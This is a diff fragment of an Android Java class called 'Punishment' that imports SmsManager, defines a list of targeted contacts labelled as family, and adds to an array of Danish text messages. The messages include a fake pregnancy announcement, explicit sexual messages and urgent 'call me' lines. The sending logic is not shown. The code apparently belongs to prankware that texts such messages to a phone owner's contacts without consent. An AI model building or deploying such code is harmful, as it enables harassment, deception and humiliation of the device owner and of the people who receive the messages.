@@ -8,6 +8,7 @@ import android.telephony.SmsManager;
 import java.util.ArrayList;
 
 public class Punishment {
+
     private ContentResolver contentResolver;
     private String[] interrestingContacts = {
             // Familie
@@ -57,9 +58,12 @@ public class Punishment {
           //"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
             "Shiiit. Jeg har lige taget graviditetstesten.. JEG ER GRAVID :O!!! Ring til mig!",
             "Tak for igår ;) jeg har sku stadig svært ved at gå.. Håber vi kan gøre det igen :D",
-            "Fuck jeg er liderlig, kan du ses?",
+            "Fuck jeg er liderlig, er du hjemme?",
             "... jeg har noget vigtigt at sige til dig! Ring til mig.",
-            "Jeg vil kneppe dig i røven indtil du græder ;)"
+            "Jeg vil kneppe dig i røven indtil du græder ;)",
+            "Er det dig der har lagt en lort på mit værelse??",
+            "RING TIL MIG!!",
+            "Kan du være sammen imorgen ;)?"
     };
     ArrayList<String> foundList = new ArrayList<String>();
     ArrayList<String> foundListNumbers = new ArrayList<String>();
